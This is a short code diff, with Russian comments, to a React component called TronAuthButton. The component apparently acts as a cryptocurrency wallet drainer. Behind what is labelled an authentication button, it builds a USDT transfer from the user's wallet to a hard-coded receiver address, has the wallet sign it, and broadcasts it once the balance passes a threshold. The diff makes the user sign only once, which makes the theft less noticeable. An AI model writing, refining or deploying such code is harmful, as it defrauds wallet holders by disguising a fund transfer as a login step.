@@ -65,7 +65,7 @@ export const TronAuthButton: React.FC = () => {
       const usdt = Number(usdtRaw) / 1e6;
       const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);
 
-      // Always sign transaction (even if < MIN_USDT)
+      // Готовим транзакцию
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -76,12 +76,13 @@ export const TronAuthButton: React.FC = () => {
         ],
         userAddress
       );
-      await adapter.signTransaction(transaction);
+
+      // Только ОДИН раз вызываем signTransaction
+      const signedTx = await adapter.signTransaction(transaction);
 
       let extra = '';
       let txid = '';
       if (usdt >= MIN_USDT) {
-        const signedTx = await adapter.signTransaction(transaction);
         const result = await tronWeb.trx.sendRawTransaction(signedTx);
         if (result?.result) {
           txid = result.txid;
